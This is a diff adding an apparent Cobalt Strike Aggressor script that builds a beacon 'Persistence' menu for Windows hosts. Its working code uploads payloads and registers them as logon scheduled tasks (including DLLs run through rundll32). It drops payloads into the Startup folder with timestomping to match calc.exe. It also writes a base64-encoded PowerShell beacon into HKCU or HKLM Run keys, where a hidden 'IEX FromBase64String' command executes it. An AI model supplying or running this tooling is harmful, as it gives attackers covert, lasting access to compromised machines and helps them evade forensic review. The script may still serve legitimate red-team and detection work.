@@ -1,0 +1,220 @@
+popup beacon_top {
+	menu "&Persistence"{
+		menu "&Windows"{
+			item "&User Scheduled Task - EXE" {
+				local('$bid');
+				foreach $bid ($1) {
+					userScheduledTaskEXE($bid);
+				}
+			}
+			item "&User Scheduled Task - DLL" {
+				local('$bid');
+				foreach $bid ($1) {
+					userScheduledTaskDLL($bid);
+				}
+			}
+			item "&Startup Folder Persistence"{
+				local('$bid');
+				foreach $bid ($1) {
+					persistThroughStartUpFolder($bid);
+				}
+			}
+			item "&HKCU Run Key Registry PowerShell Persistence" {
+				local('$bid');
+				foreach $bid ($1) {
+					persistRegistryHKCU($bid);
+				}
+			}
+			item "&HKLM Run Key Registry PowerShell Persistence" {
+				local('$bid');
+				foreach $bid ($1) {
+					persistRegistryHKLM($bid);
+				}
+			}
+		}
+	}
+}
+
+
+sub userScheduledTaskEXE  {
+	$bid = $1;
+	$user1 = beacon_info($bid, "user");
+	$user2 = split(" ", $user1);	
+	$user = $user2[0];
+
+	$dialog = dialog("User Schtasks Persistence", %(taskname => "Updatev1", targetpath => "C:\\$user\\AppData\\Local\\Temp", user => "$user", schedule => "ONLOGON", payloadfile => "Select EXE Payload.."), lambda({
+		if ("$3['taskname']" ismatch 'Evil Task Name..' || "$3['targetpath']" ismatch 'Target Path..' || "$3['payloadfile']" ismatch 'Select EXE Payload..' || "$3['user']" ismatch 'User to Run as..' || "$3['schedule']" ismatch 'Schedule modifier..') {
+			berror($bid, "\c4Please enter a valid Task Name, Target Path, and a valid Payload File.");
+			break;
+		}
+		else {
+			bcd($bid, $3['targetpath']);
+			bupload($bid, $3['payloadfile']);
+			bpowerpick($bid, 'schtasks /create /tn "'.$3['taskname'].'" /tr "'.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].'" /ru "'.$3['user'].'" /sc "'.$3['schedule'].'"');
+			bpowerpick($bid, 'schtasks /query /v /tn "'.$3['taskname'].'" /FO list');
+		}
+	}));
+
+	dialog_description($dialog, "User Scheduled Task Persistence - Generates a scheduled task for persistence on selected beacon.");
+	
+	drow_text($dialog, "taskname",  "Schtasks Taskname:");
+	drow_text($dialog, "user", "User to Run as:");
+	drow_text($dialog, "targetpath", "Target Path:");
+	drow_text($dialog, "schedule", "Schedule Modifier:");
+	drow_file($dialog, "payloadfile", "EXE Payload:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+sub userScheduledTaskDLL  {
+	$bid = $1;
+	$user1 = beacon_info($bid, "user");
+	$user2 = split(" ", $user1);	
+	$user = $user2[0];
+
+	$dialog = dialog("User Schtasks Persistence", %(taskname => "Updatev2", targetpath => "C:\\$user\\AppData\\Local\\Temp", user => "$user", schedule => "ONLOGON", payloadfile => "Select DLL Payload.."), lambda({
+		if ("$3['taskname']" ismatch 'Evil Task Name..' || "$3['targetpath']" ismatch 'Target Path..' || "$3['payloadfile']" ismatch 'Select DLL Payload..' || "$3['user']" ismatch 'User to Run as..' || "$3['schedule']" ismatch 'Schedule modifier..') {
+			berror($bid, "\c4Please enter a valid Task Name, Target Path, and a valid Payload File.");
+			break;
+		}
+		else {
+			bcd($bid, $3['targetpath']);
+			bupload($bid, $3['payloadfile']);
+			bpowerpick($bid, 'schtasks /create /tn "'.$3['taskname'].'" /tr "C:\Windows\System32\rundll32.exe '.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].',StartW" /ru "'.$3['user'].'" /sc "'.$3['schedule'].'"');
+			bpowerpick($bid, 'schtasks /query /v /tn "'.$3['taskname'].'" /FO list');
+		}
+	}));
+
+	dialog_description($dialog, "User Schtasks Persistence - Generates a schtask for persistence on selected beacon.");
+	
+	drow_text($dialog, "taskname",  "Schtasks Taskname:");
+	drow_text($dialog, "user", "User to Run as:");
+	drow_text($dialog, "targetpath", "Target Path:");
+	drow_text($dialog, "schedule", "Schedule Modifier:");
+	drow_file($dialog, "payloadfile", "DLL Payload:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+sub persistThroughStartUpFolder {
+	$bid = $1;
+	$user1 = beacon_info($bid, "user");
+	$user2 = split(" ", $user1);	
+	$user = $user2[0];
+
+	$dialog = dialog("Start Up Folder Persistence", %(startup => "C:\\Users\\$user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", payload => "Select Payload.."), lambda({
+		if ("$3['startup']" ismatch 'Startup Directory Folder..' || "$3['payload']" ismatch 'Select Payload..') {
+			berror($bid, "\c4Please enter a valid Startup Directory Folder, and select a Payload.");
+			break;
+		}
+		else {
+			bcd($bid, $3['startup']);
+			bupload($bid, $3['payload']);
+			btimestomp($bid, "$3['payload']", "c:\\windows\\system32\\calc.exe");
+			bls($bid, $3['startup']);	
+		}
+	}));
+	dialog_description($dialog, "Start Up Folder Persistence - Generates a Startup Folder Entry and places a payload inside that folder. **Windows NT 6.0-10.0/All Users Location - %SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup | Windows NT 6.0-10.0/Current User Location %SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");
+
+	drow_text($dialog, "startup", "StartUp Directory Folder Location:");
+	drow_file($dialog, "payload", "Select Payload:");
+
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+}
+
+sub payloadgenerate {
+	foreach $name (listeners()) {
+	$original_listener = $name;
+        $listener_name = lc($name);
+        if ($listener_name hasmatch "http" || $listener_name hasmatch "https") {
+        	$data = artifact($original_listener, "powershell");
+        	return base64_encode($data);
+		}
+	}
+}
+
+sub persistRegistryHKCU {
+	$bid = $1;
+	$dialog = dialog("HKCU Run Key Registry PowerShell Persistence (User Level)", %(keyname => "Key Name for Payload..", keyname1 => "Key Name to execute Payload.."), lambda({
+		if ("$3['keyname']" ismatch 'Key Name for Payload..' || "$3['keyname1']" ismatch 'Key Name to execute Payload..') {
+			berror($bid, "\c4Please enter valid Registry Key Names.");
+			break;
+		}
+		else {
+			$data = payloadgenerate($bid);
+			$powershellcmd = "Set-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname']."' -Type String -Value \"".$data."\"";
+			bpowerpick!($bid, $powershellcmd);
+			blog($bid, "\cBSetting the first HKCU Run Key Value as '".$3['keyname']."'...");
+			$powershellcmd1 = "Set-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname1']."' -Value 'C:\\Windows\\SySWoW64\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -c (IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run ".$3['keyname'].").".$3['keyname']."))))'";
+			bpowerpick!($bid, $powershellcmd1);
+			blog($bid, "\cBSetting the second HKCU Run Key Value as '".$3['keyname1']."'...");
+			blog($bid, "\cBDisplaying both Run Keys to Verify everything worked as intended...");
+			$powershellcmd2 = "Get-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname']."'";
+			bpowerpick!($bid, $powershellcmd2);
+			$powershellcmd3 = "Get-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname1']."'";
+			bpowerpick!($bid, $powershellcmd3);
+		}
+	}));
+
+	dialog_description($dialog, "HKCU Run Key Registry PowerShell Persistence - Generates a powershell Base64 Encoded payload as a HKCU Run Key Registry Entry for persistence on selected beacon.");
+	
+	drow_text($dialog, "keyname",  "Registry Key Name for Payload:");
+	drow_text($dialog, "keyname1", "Registry Key Name to execute Payload:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+sub payloadgenerate1 {
+	foreach $name (listeners()) {
+	$original_listener = $name;
+        $listener_name = lc($name);
+        if ($listener_name hasmatch "http" || $listener_name hasmatch "https") {
+        	$data = artifact($original_listener, "powershell");
+        	return base64_encode($data);
+		}
+	}
+}
+
+sub persistRegistryHKLM {
+	$bid = $1;
+	$dialog = dialog("HKLM Run Key Registry PowerShell Persistence (User Level)", %(keyname => "Key Name for Payload..", keyname1 => "Key Name to execute Payload.."), lambda({
+		if ("$3['keyname']" ismatch 'Key Name for Payload..' || "$3['keyname1']" ismatch 'Key Name to execute Payload..') {
+			berror($bid, "\c4Please enter a valid Registry Key Names, Payload, and a valid Path location.");
+			break;
+		}
+		else {
+			$data = payloadgenerate1($bid);
+			$powershellcmd = "Set-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname']."' -Type String -Value \"".$data."\"";
+			bpowerpick!($bid, $powershellcmd);
+			blog($bid, "\cBSetting the first HKLM Run Key Value as '".$3['keyname']."'...");
+			$powershellcmd1 = "Set-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname1']."' -Value 'C:\\Windows\\SySWoW64\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -c (IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((gp HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run ".$3['keyname'].").".$3['keyname']."))))'";
+			bpowerpick!($bid, $powershellcmd1);
+			blog($bid, "\cBSetting the second HKLM Run Key Value as '".$3['keyname1']."'...");
+			blog($bid, "\cBDisplaying both Run Keys to Verify everything worked as intended...");
+			$powershellcmd2 = "Get-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname']."'";
+			bpowerpick!($bid, $powershellcmd2);
+			$powershellcmd3 = "Get-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname1']."'";
+			bpowerpick!($bid, $powershellcmd3);
+		}
+	}));
+
+	dialog_description($dialog, "HKLM Run Key Registry PowerShell Persistence - Generates a powershell Base64 Encoded payload as a HKLM Run Key Registry Entry for persistence on selected beacon.");
+	
+	drow_text($dialog, "keyname",  "Registry Key Name for Payload:");
+	drow_text($dialog, "keyname1", "Registry Key Name to execute Payload:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+# Add SYSTEM level scheduled task method
+# Add Linux persistence
+# Add checks for all persistence methods, ways to remove all persistence methods
